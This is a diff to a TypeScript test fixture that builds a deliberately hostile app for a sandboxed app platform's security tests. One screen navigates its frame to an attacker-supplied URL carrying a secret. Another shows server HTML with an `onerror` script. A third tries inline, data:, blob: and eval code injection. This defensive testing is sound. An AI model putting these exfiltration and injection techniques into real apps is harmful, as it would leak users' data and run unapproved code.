@@ -7,36 +7,60 @@
  * the test runs itself.
  */
 
-const serverCode = `import { DurableObject } from "cloudflare:workers";
+const schema = `import { defineSchema } from "@grasp-os/sdk";
 
-export class App extends DurableObject {
-  secret(): string {
-    return "fictional-marker-7f3a";
-  }
+export default defineSchema({});
+`;
 
-  // HTML as a server might send it for a screen to show, an email's body
-  // say, carrying a script of its own.
-  html(): string {
-    return '<img alt="" src="no-such-image" onerror="document.body.dataset.inlineHandler = \\'ran\\'">';
-  }
-}
+const operations = `import { v } from "@grasp-os/sdk";
+import { query } from "#grasp/server";
+
+export const secret = query({ args: {}, returns: v.string(), handler: () => "fictional-marker-7f3a" });
+
+// HTML as a function might answer it for a screen to show, an email's body
+// say, carrying a script of its own.
+export const html = query({
+  args: {},
+  returns: v.string(),
+  handler: () => '<img alt="" src="no-such-image" onerror="document.body.dataset.inlineHandler = \\'ran\\'">',
+});
+`;
+
+/** The registration of an App of `screens`, each `screens/<name>.tsx`. */
+const registration = (
+  screens: readonly string[]
+): string => `import { app } from "@grasp-os/sdk";
+import { html, secret } from "./operations/attacks.ts";
+import schema from "./schema.ts";
+
+export default app({
+  name: "Attacks",
+  schema,
+  access: { tables: {} },
+  operations: { attacks: { secret, html } },
+  internalOperations: {},
+  screens: [${screens.map((name) => `{ name: "${name}", path: "/${name}", source: "screens/${name}.tsx" }`).join(", ")}],
+  uses: [],
+});
 `;
 
 /**
- * Renders, then sends its own frame to `attacker`, with what its server
- * answered in the address: a sandboxed frame may navigate itself.
+ * Renders, then sends its own frame to `attacker`, with what its App's
+ * query answered in the address: a sandboxed frame may navigate itself.
  */
 const leavingScreen = (
   attacker: string
-): string => `import { callServer } from "@grasp-os/sdk/screen";
+): string => `import { useQuery } from "@grasp-os/sdk/react";
 import { useEffect } from "react";
+import { api } from "#grasp";
 
 export default function Leaving() {
+  const secret = useQuery(api.attacks.secret, {});
   useEffect(() => {
-    void callServer<string>("secret").then((secret) => {
+    if (secret !== undefined) {
       location.href = \`${attacker}/left?carried=\${secret}\`;
-    });
-  }, []);
+    }
+  }, [secret]);
   return <main><h1>Leaving</h1></main>;
 }
 `;
@@ -57,8 +81,10 @@ export default function Wandering() {
 `;
 
 /**
- * Renders, then sends its server more in one message than the page takes
- * over the frame's port.
+ * Renders, then sends more in one message than the page takes over the
+ * frame's port. The SDK's client bounds a function's request before it
+ * sends it, so this goes through the legacy hook, which crosses the port
+ * before anything reads it; no App server is involved.
  */
 const oversizedScreen = `import { callServer } from "@grasp-os/sdk/screen";
 import { useEffect } from "react";
@@ -139,13 +165,14 @@ export default function Turn() {
 
 /**
  * Code it was approved with lets in code nobody approved, every way a
- * screen's own code can: it shows HTML its server sent (with an `onerror`
+ * screen's own code can: it shows HTML its App's query answered (with an `onerror`
  * attribute), adds an inline script and modules from `data:` and `blob:`
  * addresses, and evaluates text. Says what each did; whatever ran marks
  * the frame's body.
  */
-const injectingScreen = `import { callServer } from "@grasp-os/sdk/screen";
+const injectingScreen = `import { useQuery } from "@grasp-os/sdk/react";
 import { useEffect, useState } from "react";
+import { api } from "#grasp";
 
 const loaded = async (src: string): Promise<string> =>
   await new Promise((resolve) => {
@@ -182,10 +209,9 @@ const inject = async (): Promise<Record<string, string>> => {
 };
 
 export default function Injecting() {
-  const [html, setHtml] = useState("");
+  const html = useQuery(api.attacks.html, {}) ?? "";
   const [tried, setTried] = useState("");
   useEffect(() => {
-    void callServer<string>("html").then(setHtml);
     void inject().then((results) => {
       setTried(JSON.stringify(results));
     });
@@ -207,12 +233,35 @@ export const attackAppFiles = ({
 }: {
   attacker: string;
   turn: string;
-}): Record<string, string> => ({
-  "app/server.ts": serverCode,
-  "screens/leaving.tsx": leavingScreen(attacker),
-  "screens/wandering.tsx": wanderingScreen,
-  "screens/oversized.tsx": oversizedScreen,
-  "screens/stuck.tsx": stuckScreen,
-  "screens/turn.tsx": turnScreen(turn),
+}): Record<string, string> => {
+  const screens: Record<string, string> = {
+    leaving: leavingScreen(attacker),
+    wandering: wanderingScreen,
+    oversized: oversizedScreen,
+    stuck: stuckScreen,
+    turn: turnScreen(turn),
+    injecting: injectingScreen,
+  };
+  return {
+    "schema.ts": schema,
+    "operations/attacks.ts": operations,
+    "app.ts": registration(Object.keys(screens)),
+    ...Object.fromEntries(
+      Object.entries(screens).map(([name, code]) => [
+        `screens/${name}.tsx`,
+        code,
+      ])
+    ),
+  };
+};
+
+/**
+ * The attacking App with only its injecting screen, which an admin
+ * approves exactly as core builds it.
+ */
+export const injectingAppFiles = (): Record<string, string> => ({
+  "schema.ts": schema,
+  "operations/attacks.ts": operations,
+  "app.ts": registration(["injecting"]),
   "screens/injecting.tsx": injectingScreen,
 });
